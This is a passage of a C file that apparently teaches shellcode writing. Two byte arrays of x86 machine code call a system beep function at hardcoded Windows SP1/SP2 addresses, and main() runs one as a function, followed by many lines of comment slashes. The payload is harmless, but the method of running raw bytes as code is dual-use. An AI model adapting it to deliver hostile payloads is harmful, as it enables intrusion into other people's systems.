"\xE8\x03"                              //Frequency  \xE8\x03 = 1000
"\x00\x00\x8B\x45\xFC\xFF\xD0\xC9\xC3";

unsigned char beepsp2[] =
"\x55\x89\xE5\x83\xEC\x18\xC7\x45\xFC"
"\x53\x8A\x83\x7C"                      //Address \x53\x8A\x83\x7C = SP2
"\xC7\x44\x24\x04"
"\xD0\x03"                              //Length \xD0\x03 = 2000 (2 seconds)
"\x00\x00\xC7\x04\x24"
"\x01\x0E"                              //Frequency \x01\x0E = 3585
"\x00\x00\x8B\x45\xFC\xFF\xD0\xC9\xC3";

int main()
{
    void (*function)();
    *(long*)&function = (long)beepsp1;
    function();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


